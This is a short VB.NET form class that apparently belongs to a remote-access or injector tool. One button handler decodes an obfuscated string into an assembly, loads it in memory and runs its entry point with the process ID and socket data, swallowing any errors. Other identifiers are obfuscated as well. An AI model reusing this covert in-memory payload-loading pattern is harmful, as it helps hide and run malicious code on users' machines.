Imports System.IO
Imports System.Reflection
 Public Class Frm_SelecteBilder
    Private Sub Button1_Click(sender As Object, e As EventArgs)

    End Sub
    Private Sub SelecteBilder_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        If Frm_Main.APPDOM IsNot Nothing Then
            AppDomain.Unload(Frm_Main.APPDOM)
            Frm_Main.APPDOM = Nothing
        End If
    End Sub
    Private Sub SelecteBilder_Load(sender As Object, e As EventArgs) Handles MyBase.Load



    End Sub
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        If Frm_Main.APPDOM Is Nothing Then
            Try
                Frm_Main.APPDOM = AppDomain.CurrentDomain.Load(Frm_Config_Codes.GETJECTOR("==ARVRVAEBTBFDFBSTBFERGERGMFHDH")).EntryPoint.Invoke(Nothing, New Object() {New String() {Process.GetCurrentProcess.Id.ToString, sockets.Data.JK}})
            Catch ex As Exception
            End Try
        End If
    End Sub

    Private Sub Guna2Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If Frm_Main.B Is Nothing Then
            Frm_Main.B = New 感语十间不谢语字外方伙我传这的词种答非说肉么么文余价思肉个么
            Select Case Frm_Main.B.ShowDialog(Me)
                Case DialogResult.OK
                    Frm_Main.B.Close()
                    Frm_Main.B = Nothing
                Case Else
                    Frm_Main.B.Close()
                    Frm_Main.B = Nothing
            End Select
        End If
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Timer1.Stop()
        Button1.Visible = True
    End Sub

    Private Sub Guna2PictureBox1_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox1.Click

    End Sub
End Class